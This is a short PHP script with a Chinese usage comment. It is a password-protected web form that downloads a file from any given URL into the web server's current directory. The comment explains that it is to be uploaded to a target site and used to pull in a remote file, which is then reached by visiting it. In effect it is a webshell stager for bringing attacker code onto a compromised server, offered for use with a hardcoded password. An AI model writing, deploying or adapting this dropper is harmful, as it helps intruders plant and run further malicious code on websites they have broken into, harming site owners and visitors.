//保存为xx.php,然后通过xx.php?pwd=e访问会提示让输入地址，这里找一个不解析php的网站，然后上传去...它会自己下载文件，并保存在当前目录，然后去访问即可

<form method="post"> 
<input name="url" size="50" /> 
<input name="submit" type="submit" /> 
</form> 
<?php 
$pwd='e';//这里为你的密码 
if ($_REQUEST['pwd']!=$pwd) 
exit('Sorry ,you are not validate user!'); 
// maximum execution time in seconds 
set_time_limit (24 * 60 * 60); 
if (!isset($_POST['submit'])) die(); 
// folder to save downloaded files to. must end with slash 
$destination_folder = './'; 
$url = $_POST['url']; 
$newfname = $destination_folder . basename($url); 
$file = fopen ($url, "rb"); 
if ($file) { 
$newf = fopen ($newfname, "wb"); 
if ($newf) 
while(!feof($file)) 
{ 
fwrite($newf, fread($file, 1024 * 8 ), 1024 * 8 ); 
} 
} 
if ($file) 
{ 
fclose($file); 
} 
if ($newf) { 
fclose($newf); 
echo 'OK,File has been downloaded!'; 
} 
?> 